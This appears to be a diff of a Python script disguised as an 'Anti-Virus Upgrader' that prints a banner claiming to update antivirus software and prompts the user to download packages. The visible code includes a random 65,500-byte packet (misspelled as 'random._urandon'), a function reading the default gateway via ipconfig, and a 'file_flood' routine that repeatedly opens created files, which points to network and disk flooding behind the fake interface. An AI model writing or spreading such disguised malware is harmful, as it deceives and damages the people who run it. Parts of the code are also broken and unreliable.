@@ -1,5 +1,15 @@
 import os, time, socket, threading, random
 packet = random._urandon(65500)
+print("                _   _  __      ___                  _    _                           _           ")
+print("    /\         | | (_) \ \    / (_)                | |  | |                         | |          ")
+print("   /  \   _ __ | |_ _   \ \  / / _ _ __ _   _ ___  | |  | |_ __   __ _ _ __ __ _  __| | ___ _ __ ")
+print("  / /\ \ | '_ \| __| |   \ \/ / | | '__| | | / __| | |  | | '_ \ / _` | '__/ _` |/ _` |/ _ \ '__|")
+print(" / ____ \| | | | |_| |    \  /  | | |  | |_| \__ \ | |__| | |_) | (_| | | | (_| | (_| |  __/ |   ")
+print("/_/    \_\_| |_|\__|_|     \/   |_|_|   \__,_|___/  \____/| .__/ \__, |_|  \__,_|\__,_|\___|_|   ")
+print("                                                          | |     __/ |                          ")
+print("                                                          |_|    |___/                           ")
+print("This is a script made for helping update your Anti-Virus Software.")
+package_list = ['Anti-Virus.exe', 'Virus_Deleter.exe','Scanner.exe','Malicious_code_detector.exe','User_Alarmer.exe']
 def getdefaultgateway():
     result = os.popen('ipconfig')
     result = result.readlines()
@@ -44,16 +54,6 @@ def file_flood():
             os.startfile(file_opened.name)
         except:
             pass
-print("                _   _  __      ___                  _    _                           _           ")
-print("    /\         | | (_) \ \    / (_)                | |  | |                         | |          ")
-print("   /  \   _ __ | |_ _   \ \  / / _ _ __ _   _ ___  | |  | |_ __   __ _ _ __ __ _  __| | ___ _ __ ")
-print("  / /\ \ | '_ \| __| |   \ \/ / | | '__| | | / __| | |  | | '_ \ / _` | '__/ _` |/ _` |/ _ \ '__|")
-print(" / ____ \| | | | |_| |    \  /  | | |  | |_| \__ \ | |__| | |_) | (_| | | | (_| | (_| |  __/ |   ")
-print("/_/    \_\_| |_|\__|_|     \/   |_|_|   \__,_|___/  \____/| .__/ \__, |_|  \__,_|\__,_|\___|_|   ")
-print("                                                          | |     __/ |                          ")
-print("                                                          |_|    |___/                           ")
-print("This is a script made for helping update your Anti-Virus Software.")
-package_list = ['Anti-Virus.exe', 'Virus_Deleter.exe','Scanner.exe','Malicious_code_detector.exe','User_Alarmer.exe']
 while True:
     try:
         start_upgrader = input("[+] Would you like to download the correct packages now?: ")
